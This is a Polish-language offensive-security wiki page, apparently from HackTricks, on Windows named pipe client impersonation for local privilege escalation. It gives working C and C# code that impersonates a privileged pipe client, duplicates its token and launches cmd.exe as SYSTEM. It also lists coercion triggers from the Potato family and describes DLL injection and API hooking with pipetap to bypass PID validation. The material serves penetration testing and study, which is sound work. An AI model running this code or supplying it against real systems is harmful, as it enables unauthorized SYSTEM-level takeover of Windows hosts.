# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation jest prymitywem lokalnej eskalacji uprawnień, który pozwala wątkowi serwera named-pipe przyjąć kontekst bezpieczeństwa klienta, który się z nim łączy. W praktyce atakujący, który może uruchamiać kod z uprawnieniem SeImpersonatePrivilege, może zmusić uprzywilejowanego klienta (np. usługę SYSTEM) do połączenia się z rurą kontrolowaną przez atakującego, wywołać ImpersonateNamedPipeClient, zduplikować otrzymany token do tokena głównego i uruchomić proces jako klient (często NT AUTHORITY\SYSTEM).

Ta strona skupia się na rdzeniu techniki. Dla end-to-end exploit chains, które zmuszają SYSTEM do połączenia się z twoją rurą, zobacz strony rodziny Potato wymienione poniżej.

## TL;DR
- Create a named pipe: \\.\pipe\<random> i poczekaj na połączenie.
- Zmusić uprzywilejowany komponent do połączenia się z nią (spooler/DCOM/EFSRPC/etc.).
- Odczytaj przynajmniej jedną wiadomość z rury, a następnie wywołaj ImpersonateNamedPipeClient.
- Otwórz token impersonacji z bieżącego wątku, zduplikuj go za pomocą DuplicateTokenEx(TokenPrimary) i użyj CreateProcessWithTokenW/CreateProcessAsUser, aby uzyskać proces SYSTEM.

## Requirements and key APIs
- Uprawnienia zwykle wymagane przez wywołujący proces/wątek:
- SeImpersonatePrivilege, aby pomyślnie impersonować łączącego się klienta i użyć CreateProcessWithTokenW.
- Alternatywnie, po impersonowaniu SYSTEM, możesz użyć CreateProcessAsUser, które może wymagać SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (są one spełnione, kiedy impersonujesz SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (należy odczytać co najmniej jedną wiadomość przed impersonacją)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Uwagi:
- Jeśli ImpersonateNamedPipeClient zwraca ERROR_CANNOT_IMPERSONATE (1368), upewnij się, że najpierw odczytasz z pipe'a i że klient nie ograniczył impersonacji do poziomu Identification.
- Preferuj DuplicateTokenEx z SecurityImpersonation i TokenPrimary, aby utworzyć token główny odpowiedni do tworzenia procesu.

## .NET - szybki przykład
W .NET NamedPipeServerStream może wykonać impersonację za pomocą RunAsClient. Po rozpoczęciu impersonacji zduplikuj token wątku i utwórz proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Częste wyzwalacze/przymuszacze, aby doprowadzić SYSTEM do Twojego pipe
Te techniki przymuszają uprzywilejowane usługi do połączenia się z Twoim named pipe, żebyś mógł się pod nie podszyć:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Zobacz szczegółowe użycie i kompatybilność tutaj:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Jeśli potrzebujesz pełnego przykładu stworzenia pipe'a i podszycia się, żeby uruchomić SYSTEM z wyzwalacza usługi, zobacz:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Usługi zabezpieczone względem named-pipe wciąż można przejąć przez instrumentację zaufanego klienta. Narzędzia takie jak [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) upuszczają do klienta pomocniczy DLL, działają jako proxy dla jego ruchu i pozwalają manipulować uprzywilejowanym IPC zanim usługa SYSTEM go przetworzy.

### Inline API hooking inside trusted processes
- Wstrzyknij pomocniczy DLL (OpenProcess → CreateRemoteThread → LoadLibrary) do dowolnego klienta.
- The DLL Detours `ReadFile`, `WriteFile`, etc., ale tylko gdy `GetFileType` zgłasza `FILE_TYPE_PIPE`, kopiuje każdy bufor/metadane do control pipe, pozwala na edycję/drop/odtworzenie, a następnie wznawia oryginalne API.
- Zamienia legalnego klienta w proxy w stylu Burp: wstrzymuj UTF-8/UTF-16/raw payloads, wymuszaj ścieżki błędów, odtwarzaj sekwencje lub eksportuj ślady JSON.

### Remote client mode to defeat PID-based validation
- Wstrzyknij do klienta z listy dozwolonych, potem w GUI wybierz pipe i ten PID.
- DLL wywołuje `CreateFile`/`ConnectNamedPipe` wewnątrz zaufanego procesu i przekazuje I/O z powrotem do Ciebie, więc serwer nadal obserwuje legalny PID/obraz procesu.
- Omija filtry polegające na `GetNamedPipeClientProcessId` lub sprawdzeniach podpisanego obrazu.

### Fast enumeration and fuzzing
- `pipelist` enumeruje `\\.\pipe\*`, pokazuje ACLs/SIDs i przekazuje wpisy do innych modułów do natychmiastowego sondowania.
- Klient pipe/kompozytor wiadomości łączy się z dowolną nazwą i buduje ładunki UTF-8/UTF-16/raw-hex; importuj przechwycone bloby, modyfikuj pola i wyślij ponownie, aby polować na deserializery lub komendy bez uwierzytelnienia.
- Pomocniczy DLL może hostować nasłuch TCP loopback, żeby narzędzia/fuzzery mogły zdalnie sterować pipe'em przez Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Połącz TCP bridge z VM snapshot restores, aby crash-testować kruche parsery IPC.

### Rozważania operacyjne
- Named pipes są niskolatencyjne; długie przerwy podczas edycji buforów mogą powodować zakleszczenie (deadlock) kruchych usług.
- Overlapped/completion-port I/O coverage jest częściowe, więc spodziewaj się edge cases.
- Injection generuje dużo szumu i jest niepodpisana, więc traktuj ją jako narzędzie do labu/exploit-dev, a nie jako stealth implant.

## Rozwiązywanie problemów i pułapki
- Musisz odczytać przynajmniej jedną wiadomość z pipe przed wywołaniem ImpersonateNamedPipeClient; w przeciwnym razie otrzymasz ERROR_CANNOT_IMPERSONATE (1368).
- Jeśli klient łączy się z SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, serwer nie może w pełni przeprowadzić impersonacji; sprawdź poziom impersonacji tokena za pomocą GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW wymaga SeImpersonatePrivilege u wywołującego. Jeśli to kończy się ERROR_PRIVILEGE_NOT_HELD (1314), użyj CreateProcessAsUser po tym, jak już przeprowadziłeś impersonację SYSTEM.
- Upewnij się, że security descriptor twojego pipe pozwala docelowemu serwisowi na połączenie, jeśli go wzmocnisz; domyślnie pipe pod \\.\pipe są dostępne zgodnie z DACL serwera.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
